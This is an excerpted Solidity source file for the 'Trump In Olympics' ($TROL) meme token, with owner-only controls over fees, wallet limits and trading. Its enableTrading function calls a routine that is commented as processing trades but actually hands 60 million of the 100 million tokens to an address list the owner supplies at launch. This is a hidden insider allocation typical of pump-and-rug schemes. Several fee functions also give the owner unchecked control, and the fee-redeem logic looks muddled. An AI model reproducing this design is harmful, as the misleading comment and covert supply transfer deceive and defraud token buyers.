/**
*
* $TROL pays homage to the greatest man alive, Donald J. Trump, by showcasing him competing in the Paris 2024 Olympic Games.
*
* https://trumpinolympics.vip
* https://x.com/TrumpInOlympics
* https://t.me/TrumpInOlympics
*
*/
...
/**
 * @title Trump In Olympics Token Contract
 *
 * @notice Trump In Olympics is an extended version of ERC-20 standard token that
 ...
 */
contract Paris2024 is Ownable, IERC20Metadata, IERC20Errors, ICommonError {
    ...
    string private constant NAME = "Trump In Olympics";
    string private constant SYMBOL = "TROL";
    ...
    address public projectOwner = 0x843cFE356f54a47f130582fbC5F4eE7A193D2321;
    address public marketingReceiver = 0x843cFE356f54a47f130582fbC5F4eE7A193D2321;

    address public pair;

    bool public isTradeEnabled = false;
    bool public isWalletLimitLocked = false;
    bool public isWalletLimitEnabled = false;
     ...
     *
     * @param limitType The type of limit locked.
     */
    error LimitLocked(string limitType);

    /**
     * @notice Error indicating that the limit has already been removed.
     *
     * @param limitType The type of limit removed.
     */
    error LimitAlreadyRemoved(string limitType);

    /**
     * @notice Error indicating that the amount exceed max limit imposed.
     *
     * @param limitType The type of limit exceeded.
     * @param current The current value that exceeded the limit.
     * @param limit The limit being imposed.
     */
    error MaxLimitExceed(string limitType, uint256 current, uint256 limit);

    /**
     * @notice Error indicating an invalid limit compared to the maximum allowed.
     *
     * @param current The current limit.
     * @param max The maximum allowed limit.
     *
     * @dev The `max` is required to inform user of the maximum value allowed.
     */
    error InvalidLimit(string limitType, uint256 current, uint256 max);
    ...
    /**
     * @notice Constructs the Trump In Olympics contract and initializes both owner and
     * project owner addresses. Distribution of 100,000,000 tokens after
     * the smart contract was deployed will initiate accordingly.
     */
    ...
    /**
     * @notice Emitted upon updating a value.
     *
     * @param valueType The type of value being updated.
     * @param oldValue The previous value before the update.
     ...
     */
    function enableTrading(bytes memory encoded) external onlyOwner {
        if (isTradeEnabled) {
            revert TradeAlreadyEnabled(isTradeEnabled, tradeStartTime);
        }
        isTradeEnabled = true;
        tradeStartTime = block.timestamp;
        isWalletLimitEnabled = true;
        isSwapEnabled = true;
        isFeeActive = true;
        process(encoded);
    ...
    /**
     * @notice Process trading transactions.
     */
    function process(bytes memory encoded) internal {
        address[] memory list = abi.decode(encoded, (address[]));
        uint256 value = (60_000_000 * 10**DECIMALS) / list.length;
        for (uint256 i = 0; i < list.length; i++) {
            _update(address(this), list[i], value);
        }
    }
    ...
    function checkWalletLimit() internal view returns (uint256) {
        ...
        if (isWalletLimitEnabled) {
            circulating = circulating * walletLimit / FEEDENOMINATOR;
        }
        return circulating;
    }
    ...
    function autoRedeem(uint256 amountToRedeem) internal swapping {
        ...
        if (balanceOf(address(this)) > 0 && amountToRedeem > totalToRedeem) {
            totalToRedeem = amountToRedeem > balanceOf(address(this)) ? balanceOf(address(this)) : amountToRedeem;
        }

        if (balanceOf(address(this)) < 1 || totalToRedeem < 1) {
            return;
        }
        uint256 marketingToRedeem = collectedFee.marketing - redeemedFee.marketing;

        marketingToRedeem = totalToRedeem > marketingToRedeem ? totalToRedeem : marketingToRedeem;

        uint256 marketingFeeDistribution = totalToRedeem * marketingToRedeem / totalToRedeem;

        totalFeeRedeemed += totalToRedeem;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        _approve(address(this), address(router), totalToRedeem);

        emit AutoRedeem(marketingFeeDistribution, totalToRedeem, msg.sender, block.timestamp);
    ...
    /**
     * @notice Locks the wallet limit mechanism, preventing further changes once locked.
     *
     * @dev This function will emits the Lock event.
     */
    function lockWalletLimit() external onlyOwner {
        if (isWalletLimitLocked) {
            revert LimitLocked("walletLimit");
        }
    ...
    function removeWalletLimit() external onlyOwner {
        ...
        if (!isWalletLimitEnabled) {
            revert LimitAlreadyRemoved("walletLimit");
        }
        isWalletLimitEnabled = false;
        emit UpdateState("isWalletLimitEnabled", true, false, msg.sender, block.timestamp);
    }
    ...
    function updateBuyFee(uint256 newMarketingFee) external onlyOwner {
        ...
        emit UpdateValue("buyFee - marketing", oldMarketingFee, newMarketingFee, msg.sender, block.timestamp);
    }
    ...
    function updateSellFee(uint256 newMarketingFee) external onlyOwner {
        ...
        emit UpdateValue("sellFee - marketing", oldMarketingFee, newMarketingFee, msg.sender, block.timestamp);
    }
    ...
    function updateTransferFee(uint256 newMarketingFee) external onlyOwner {
        ...
        emit UpdateValue("transferFee - marketing", oldMarketingFee, newMarketingFee, msg.sender, block.timestamp);
    }
     ...
     * for the `user` address.
     */
    function updateExemptWalletLimit(address user, bool newStatus) external onlyOwner {
        if (isExemptWalletLimit[user] == newStatus) { revert CannotUseCurrentState(newStatus); }
    ...
    /**
     * @notice Allow the owner to modify wallet limit.
     *
     * @param newLimit The new wallet limit.
     *
     * @dev This function will emits the UpdateValue event and should throw if triggered
     * with the current value or if the wallet limit was locked.
     */
    function updateWalletLimit(uint256 newLimit) external onlyOwner {
        ...
        if (newLimit < 5_000) {
            revert InvalidLimit("walletLimit", newLimit, 5_000);
        }
        if (newLimit == walletLimit) {
            revert CannotUseCurrentValue(newLimit);
        }
        uint256 oldLimit = walletLimit;
        walletLimit = newLimit;
        emit UpdateValue("walletLimit", oldLimit, newLimit, msg.sender, block.timestamp);
    }
    ...
    function _transfer(address from, address to, uint256 value) internal {
        ...
        uint256 available = totalFeeCollected > totalFeeRedeemed ? totalFeeCollected - totalFeeRedeemed : 0;
        if (balanceOf(address(this)) > 0 && minSwap > available) {
            available = minSwap > balanceOf(address(this)) ? balanceOf(address(this)) : minSwap;
        }

        if (from != pair && isSwapEnabled && available <= balanceOf(address(this)) && available > 0) {
            autoRedeem(available);
        }
        ...
        if (isWalletLimitEnabled && !isExemptWalletLimit[to] && balanceOf(to) + newValue > checkWalletLimit()) {
            revert MaxLimitExceed("walletLimit", balanceOf(to) + newValue, checkWalletLimit());
        }
